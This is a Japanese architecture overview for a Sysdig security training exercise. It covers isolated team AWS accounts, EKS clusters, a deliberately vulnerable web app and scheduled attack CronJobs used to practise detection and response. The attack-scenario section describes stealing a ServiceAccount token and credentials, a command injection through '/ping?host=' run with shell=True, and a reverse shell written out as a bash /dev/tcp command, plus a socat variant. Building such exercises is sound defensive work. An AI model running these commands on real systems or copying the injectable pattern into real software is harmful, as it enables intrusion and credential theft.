# アーキテクチャ

## 全体像

5〜6チーム分の独立したAWSアカウント(team-a〜f)に、それぞれ:

- EKSクラスタ(VPC込み、Terraformで構築)
- 脆弱性を仕込んだWebアプリ(`vulnerable-webapp`)と、攻撃を自動実行するCronJob群
- Sysdig Secure(Shield)のエージェント

を用意し、「Sysdig未接続の状態で攻撃がすでに進行している」→「オンボーディングで接続すると見える」という体験を作る。

```
Management Account(Organization/Control Tower)
├── Security OU(Log Archive / Audit) ※Control Tower自動作成、本演習では未使用
└── GameDay OU(手動作成)
    ├── gameday-control(中央管理・運営用)
    ├── team-a(検証・リハーサル専用)
    ├── team-b
    ├── team-c
    ├── team-d
    ├── team-e
    └── team-f
```

チームごとにアカウントを分離しているのは、1アカウント(namespace分離のみ)で複数チームを動かすとIAM/クォータの競合が起きるため。

## アクセス・可視性の分離

- **AWS側**: IAM Identity Centerで、チームごとに共有ログインUserとPermission Set(GameDayParticipantAccess)を発行し、各チームを自分のアカウントにだけAccount Assignmentする。
- **Sysdig側**: チームごとにZoneを1つずつ定義し、各Zoneをそのチームのクラスタ(`gameday-team-X`)にスコープする。チームは自分のZoneの検知・スコアのみ閲覧できる。

教訓: Permission SetとOUを設計しただけでは終わらない。実際にUserを作成し招待メールを送るところまでが必要な最終ステップで、本番直前まで気づかれにくい。

## 攻撃シナリオ(credential-theftチェーン)

`vulnerable-webapp`(namespace `gameday`)に対して、2つの侵入経路から継続的に攻撃を仕掛ける。

| 侵入経路 | 内容 | ファイル |
|---|---|---|
| `kubectl exec`経由 | 攻撃用ServiceAccount(`attacker-runner`)が`pods/exec`権限で侵入し、シェルを実行 | `k8s/03_attacks_webshell.yaml` |
| HTTPコマンドインジェクション | `vulnerable-webapp`自体の`/ping?host=`パラメータが`shell=True`で実行される | `k8s/01_vulnerable-app.yaml` |

侵入後の挙動(`webshell-attack-script`):

1. ServiceAccountトークンを読み取り
2. そのトークンでKubernetes APIから`Secret db-credentials`の取得を試みる(`SECRET_ACCESS=GRANTED`/`DENIED`で判定)
3. 環境変数から`PASSWORD`/`SECRET`/`USERNAME`を含む値を抽出
4. `/bin/true`を`/tmp/nmap`にコピーし、偵察ツールを偽装して実行
5. `bash -i >& /dev/tcp/kubernetes.default.svc/443`でリバースシェルを確立(Sysdigの`Reverse Shell Detected`ルールが発火)

このCronJob(`webshell-attack-loop`)は1分おきに実行され続ける。封じ込め(ワークロード停止・入れ替え)とRBAC修正が効くと、以降の実行結果が自然に`BLOCKED`へ切り替わる(= 防御の証明)。

### Wave2(再攻撃・検証用)

`k8s/05_wave2_attacks.yaml`は、Wave1とは別の手口で「本当に直したか」を試す再攻撃。

- **Wave2-a**: 同じPodにexecで入り、socatによる別系統のリバースシェルを試す。RBAC修正だけでは防げない(ワークロードを止めたかどうかの持続確認)。
- **Wave2-b**: `kubectl exec`を使わず、Service経由で本物のコマンドインジェクション(`/ping?host=`)を再突破する。RBAC修正・Pod入れ替えだけでは防げず、脆弱なコード/イメージを直すかサービスを止めない限り通り続ける。

`k8s/fire_wave2.sh`でWave1の即時1回実行、`k8s/fire_wave2ab.sh`でWave2-a/bの開始ができる。

## デコイ

`01_vulnerable-app.yaml`には、調査フェーズ用に「本物っぽい別のワークロードと別のSecret」(`internal-dashboard`、`internal-tool-credentials`)を意図的に混ぜてある。「侵害されたのは本当にどのPod/SA/Secretか」を、検知ログから正しく裏取りさせるための教材。

## Sysdig側の設定

`sysdig/shield-values-template.yaml`・`shield-values-vm.yaml`は、Shield Helmチャートの値の下書き。ランタイム検知に加えて脆弱性管理(VM)を有効化する差分が入っている。**chart値のキー名はバージョンごとに変わるため、適用前に必ず`helm show values`で実際のキー名を確認すること**(コメント参照)。
